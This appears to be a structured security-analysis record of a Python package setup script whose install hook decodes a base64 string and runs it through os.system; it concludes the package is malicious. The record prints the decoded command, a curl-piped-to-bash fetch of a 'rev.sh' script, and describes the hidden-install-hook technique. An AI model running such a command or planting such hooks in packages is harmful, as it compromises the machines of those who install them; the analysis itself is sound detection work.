  "purpose": "Define a Python package setup with hooks that execute code during installation or development, including a base64-encoded system command.",
  "sources": "Base64-encoded string in notmalfunc() function, invoked during install process.",
  "sinks": "os.system call executing decoded base64 code, potentially running arbitrary system commands.",
  "flows": "Base64 string decoded in notmalfunc() -> os.system executes decoded command.",
  "anomalies": "Use of base64 decoding for command execution; command appears to be a URL call. No explicit credentials but obscured code behavior. The command executed is 'curl -s http://localhost:8000/rev.sh | bash', which could fetch and execute remote scripts.",
  "analysis": "The code imports standard setup tools and defines a function to decode base64 strings. The function 'notmalfunc' decodes a base64 string and executes it via os.system. The string decodes to 'curl -s http://localhost:8000/rev.sh | bash', which attempts to fetch and execute a remote script. This is triggered during the 'install' process in the AfterInstall class, indicating malicious intent or remote code execution capability. The code structure includes hooks for install and develop commands, and the setup configuration appears typical but with the malicious code embedded in the install hook. No obfuscated code per se, but obfuscation is achieved via base64 encoding of a potentially harmful command.",
  "conclusion": "The code contains malicious behavior by decoding and executing a remote script during installation, which could compromise the system. The use of base64 to hide remote code execution is suspicious and indicative of malicious intent.",
